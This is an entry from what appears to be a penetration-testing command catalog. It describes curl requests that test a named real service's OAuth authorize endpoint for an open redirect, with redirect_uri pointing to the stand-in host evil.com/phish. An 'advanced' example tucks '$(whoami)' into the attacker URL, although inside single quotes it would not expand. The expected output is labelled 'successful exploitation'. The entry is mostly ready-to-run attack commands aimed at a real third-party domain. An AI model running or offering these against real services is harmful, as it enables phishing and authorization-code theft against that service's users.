---
id: cmd-uuid-001
data: >-
  curl -X POST 'https://moneybird.com/oauth/authorize' -d
  'redirect_uri=https://evil.com/phish' -d 'client_id=example_client' -d
  'response_type=code' -v
tags:
  - web
  - exploit
  - oauth
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.798Z'
verified: false
validated: true
submitted: true
---
# curl-oauth-redirect-post

## Command

```bash
curl -X POST 'https://moneybird.com/oauth/authorize' \
  -d 'redirect_uri=https://evil.com/phish' \
  -d 'client_id=example_client' \
  -d 'response_type=code' \
  -v
```

## Description

This command uses curl to send a POST request to an OAuth authorization endpoint, exploiting an open redirect by including an arbitrary redirect_uri. It tests for lack of URL validation, useful in web vulnerability assessments targeting OAuth flows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://moneybird.com/oauth/authorize'` | Target OAuth endpoint URL | Yes |
| `-d 'redirect_uri=...'` | Sets the redirect_uri parameter to an arbitrary URL | Yes |
| `-d 'client_id=...'` | Provides the OAuth client ID | Yes |
| `-d 'response_type=code'` | Specifies the OAuth response type | Yes |
| `-v` | Enables verbose output to show headers like Location | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://moneybird.com/oauth/authorize' -d 'redirect_uri=https://evil.com' -d 'client_id=test' -d 'response_type=code'
```

### Advanced Usage

```bash
curl -X POST 'https://moneybird.com/oauth/authorize' \
  -d 'redirect_uri=https://evil.com/phish?token=$(whoami)' \
  -d 'client_id=example_client' \
  -d 'response_type=code' \
  -d 'scope=read' \
  -v -L
```

Follows the redirect (-L) for full chain verification.

## Expected Output

A 302 Found response with a Location header pointing to the arbitrary redirect_uri, e.g.,

```
< HTTP/1.1 302 Found
< Location: https://evil.com/phish
```

No validation errors indicate successful exploitation.

## Related

- [[Related Procedure|procedures/Exploit-Open-Redirect-in-OAuth-via-POST]]
